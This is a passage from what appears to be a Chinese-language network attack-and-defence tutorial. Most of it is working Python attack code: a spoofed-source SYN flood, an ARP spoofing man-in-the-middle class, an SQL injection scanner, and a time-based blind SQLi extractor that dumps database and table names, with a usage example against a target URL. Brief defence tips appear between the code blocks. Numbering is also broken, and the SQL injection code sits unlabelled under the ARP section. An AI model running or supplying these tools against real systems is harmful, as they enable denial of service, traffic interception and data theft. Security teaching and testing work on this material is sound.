### 1.1 TCP/IP协议栈攻击与防御

#### 1.1.1 TCP SYN Flood攻击原理与防御

**攻击原理**：SYN Flood利用TCP三次握手的缺陷，攻击者发送大量SYN包但不完成后续握手，耗尽服务器资源。

```python
# SYN Flood攻击示例（仅用于教学，勿用于非法用途）
import socket
import random
from scapy.all import *

def syn_flood(target_ip, target_port, count=1000):
    for i in range(count):
        # 随机源IP和源端口
        src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        src_port = random.randint(1024, 65535)
        
        # 构造SYN包
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(0, 2**32-1))
        
        # 发送数据包
        send(ip_layer/tcp_layer, verbose=False)
        print(f"发送第{i+1}个SYN包")

# 防御措施
# 1. SYN Cookie技术
# 2. 连接速率限制
# 3. 使用防火墙和IDS/IPS系统
```

**防御方案**：
1. **SYN Cookie**：服务器不维护半连接状态，通过计算生成序列号
2. **增加积压队列**：`sysctl -w net.ipv4.tcp_max_syn_backlog=8192`
3. **缩短超时时间**：`sysctl -w net.ipv4.tcp_synack_retries=2`
4. **使用防火墙**：配置规则限制SYN包速率

### 1.3 ARP欺骗与防御

#### 1.3.1 ARP欺骗攻击原理

**ARP协议缺陷**：无状态、无验证机制，任何主机都可以发送ARP响应。

```python
# ARP欺骗工具（仅授权测试）
from scapy.all import *
import time
import sys

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
    
    def get_mac(self, ip):
        # ARP请求获取MAC地址
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, 
                          verbose=False, iface=self.interface)[0]
        return answered_list[0][1].hwsrc
    
    def spoof(self):
        # 发送伪造的ARP响应给目标
        packet = ARP(op=2, pdst=self.target_ip, 
                    hwdst=self.target_mac,
                    psrc=self.gateway_ip)
        send(packet, verbose=False, iface=self.interface)
        
        # 发送伪造的ARP响应给网关
        packet = ARP(op=2, pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=self.target_ip)
        send(packet, verbose=False, iface=self.interface)
    
    def restore(self):
        # 恢复ARP表
        send(ARP(op=2, pdst=self.gateway_ip,
                hwdst="ff:ff:ff:ff:ff:ff",
                psrc=self.target_ip,
                hwsrc=self.target_mac), count=5, verbose=False)
        
        send(ARP(op=2, pdst=self.target_ip,
                hwdst="ff:ff:ff:ff:ff:ff",
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac), count=5, verbose=False)

# 防御措施
# 1. 静态ARP绑定
# 2. 使用ARP检测（DAI）
# 3. 部署802.1X认证
# 4. 网络分段
```

```python
# SQL注入探测工具
import requests
import re

class SQLiScanner:
    def __init__(self, url, params):
        self.url = url
        self.params = params
        self.session = requests.Session()
        self.payloads = ["'", "1' OR '1'='1", "1 AND 1=1", "1 AND 1=2"]
    
    def detect_error_based(self):
        """基于错误的SQL注入检测"""
        errors = {
            'mysql': ["You have an error in your SQL syntax", "MySQL"],
            'microsoft': ["Microsoft SQL Native Client error", "ODBC"],
            'oracle': ["ORA-", "Oracle"],
            'postgresql': ["PostgreSQL", "pg_query"]
        }
        
        for param in self.params:
            for payload in self.payloads:
                test_params = self.params.copy()
                test_params[param] = payload
                
                try:
                    response = self.session.get(self.url, params=test_params)
                    
                    for db_type, patterns in errors.items():
                        for pattern in patterns:
                            if pattern.lower() in response.text.lower():
                                print(f"[+] {db_type} SQL注入发现于参数: {param}")
                                return True
                except:
                    continue
        
        return False
    
    def detect_blind(self):
        """布尔盲注检测"""
        # 正常响应
        normal_response = self.session.get(self.url, params=self.params)
        
        for param in self.params:
            # 真条件
            true_params = self.params.copy()
            true_params[param] = "1 AND 1=1"
            
            # 假条件
            false_params = self.params.copy()
            false_params[param] = "1 AND 1=2"
            
            try:
                true_response = self.session.get(self.url, params=true_params)
                false_response = self.session.get(self.url, params=false_params)
                
                # 比较响应长度
                if len(true_response.text) != len(false_response.text):
                    if len(true_response.text) == len(normal_response.text):
                        print(f"[+] 布尔盲注可能存在于参数: {param}")
                        return True
            except:
                continue
        
        return False
```

**时间盲注自动化**：
```python
# 时间盲注自动化工具
import requests
import time
import string

class TimeBasedSQLi:
    def __init__(self, url, param, delay=2):
        self.url = url
        self.param = param
        self.delay = delay
        self.session = requests.Session()
        self.charset = string.ascii_lowercase + string.digits + string.ascii_uppercase
    
    def check_vulnerable(self):
        """检查是否存在时间盲注"""
        payload = f"1 AND SLEEP({self.delay})"
        params = {self.param: payload}
        
        start_time = time.time()
        self.session.get(self.url, params=params)
        elapsed = time.time() - start_time
        
        return elapsed >= self.delay
    
    def extract_data(self, query, data_length=50):
        """提取数据"""
        result = ""
        
        for i in range(1, data_length + 1):
            for char in self.charset:
                # 构造payload
                payload = f"1 AND IF(SUBSTRING(({query}),{i},1)='{char}',SLEEP({self.delay}),0)"
                params = {self.param: payload}
                
                start_time = time.time()
                self.session.get(self.url, params=params)
                elapsed = time.time() - start_time
                
                if elapsed >= self.delay:
                    result += char
                    print(f"已找到字符: {char} | 当前结果: {result}")
                    break
        
        return result
    
    def extract_databases(self):
        """提取数据库名"""
        query = "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata"
        return self.extract_data(query)
    
    def extract_tables(self, database):
        """提取表名"""
        query = f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{database}'"
        return self.extract_data(query)

# 使用示例
sqli = TimeBasedSQLi("http://target.com/page", "id")
if sqli.check_vulnerable():
    databases = sqli.extract_databases()
    print(f"数据库: {databases}")
```
